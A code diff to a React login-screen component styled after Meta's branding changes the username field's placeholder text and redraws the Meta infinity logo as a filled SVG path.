@@ -82,7 +82,7 @@ function Screen1({ onNext }: { onNext: () => void }) {
           <div className="bg-transparent flex items-center" style={{ height: 56, borderRadius: 10, padding: 16, marginBottom: 14, border: '1px solid rgba(255,255,255,0.15)' }}>
             <input
               type="text"
-              placeholder="Username, email address or mobile number"
+              placeholder="Username"
               value={username}
               onChange={(e) => setUsername(e.target.value)}
               className="w-full bg-transparent text-white text-[16px] outline-none placeholder:text-[#a8a8a8]"
@@ -122,14 +122,11 @@ function Screen1({ onNext }: { onNext: () => void }) {
 
       {/* Meta Logo Footer */}
       <div className="absolute left-0 right-0 flex justify-center items-center gap-1.5" style={{ bottom: 20 }}>
-        {/* Meta infinity loop icon */}
-        <svg width="28" height="14" viewBox="0 0 28 14" fill="none">
+        {/* Meta infinity loop icon — proper continuous path */}
+        <svg width="26" height="14" viewBox="0 0 26 14" fill="none">
           <path
-            d="M8.5 1C5.46 1 3 3.46 3 6.5C3 9.54 5.46 12 8.5 12C9.5 12 10.42 11.72 11.2 11.24L14 9.5V13H16V1H14V5L11.2 3.24C10.42 2.76 9.5 2.5 8.5 2.5C6.29 2.5 4.5 4.29 4.5 6.5C4.5 8.71 6.29 10.5 8.5 10.5C10.71 10.5 12.5 8.71 12.5 6.5C12.5 4.29 10.71 2.5 8.5 2.5M19.5 1C16.46 1 14 3.46 14 6.5C14 9.54 16.46 12 19.5 12C20.5 12 21.42 11.72 22.2 11.24L25 9.5V13H27V1H25V5L22.2 3.24C21.42 2.76 20.5 2.5 19.5 2.5C17.29 2.5 15.5 4.29 15.5 6.5C15.5 8.71 17.29 10.5 19.5 10.5C21.71 10.5 23.5 8.71 23.5 6.5C23.5 4.29 21.71 2.5 19.5 2.5"
-            stroke="#a8a8a8"
-            strokeWidth="2"
-            strokeLinecap="round"
-            strokeLinejoin="round"
+            d="M7.5 1C4.46 1 2 3.46 2 6.5S4.46 12 7.5 12c1.5 0 2.8-.6 3.75-1.55L13 9.2V13h2V1h-2v5L11.25 3.55C10.3 2.6 9 2 7.5 2 4.46 2 3 4.46 3 6.5S4.46 11 7.5 11s4.5-2.46 4.5-4.5S10.54 2 7.5 2z M18.5 1c-3.04 0-5.5 2.46-5.5 5.5S15.46 12 18.5 12c1.5 0 2.8-.6 3.75-1.55L24 9.2V13h2V1h-2v5l-1.75-1.45C21.3 2.6 20 2 18.5 2 15.46 2 14 4.46 14 6.5S15.46 11 18.5 11s4.5-2.46 4.5-4.5S21.54 2 18.5 2z"
+            fill="#a8a8a8"
           />
         </svg>
         <span className="text-[#a8a8a8] text-[16px] font-bold tracking-tight" style={{ fontFamily: 'system-ui, -apple-system, sans-serif' }}>
